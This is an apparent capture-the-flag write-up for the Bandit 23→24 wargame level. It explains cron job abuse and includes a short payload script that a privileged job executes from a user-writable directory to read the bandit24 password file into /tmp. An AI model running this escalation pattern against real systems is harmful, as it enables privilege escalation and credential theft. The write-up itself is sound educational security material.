# Bandit 23 → 24: Cron job abuse

## Objective
Get the password for `bandit24` by reading what a cron job runs, then making that job run my own script.

## Concepts
- Cron scheduling (`/etc/cron.d/`)
- A privileged job that executes files from a directory a low-privilege user can write to
- File permissions so a background daemon can run the script (`chmod`)

## Tools
`cat`, `mkdir`, `chmod`, `nano`, `cp`, `ls`

## Walkthrough

**1. Inspect the cron job** to see what runs as `bandit24`:

```bash
cat /etc/cron.d/cronjob_bandit24
cat /usr/bin/cronjob_bandit24.sh
```

**2. Write a payload script.** The job runs as `bandit24`, so my script runs with that user's rights:

```bash
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/my_dir/password.txt
chmod 666 /tmp/my_dir/password.txt
```

**3. Set permissions and drop it where the job will pick it up:**

```bash
chmod 777 /tmp/my_dir/script.sh
cp /tmp/my_dir/script.sh /var/spool/bandit24/foo/
```

**4. Wait about a minute** for cron to run, then read the output file.

> 💡 The working directory (`/tmp/my_dir`) also has to be writable by `bandit24`, otherwise the script can't create `password.txt`.

## Takeaway
A scheduled job that runs whatever is dropped into a user-writable directory is a privilege escalation path. In real systems, look for the same pattern in cron, systemd timers and CI runners.
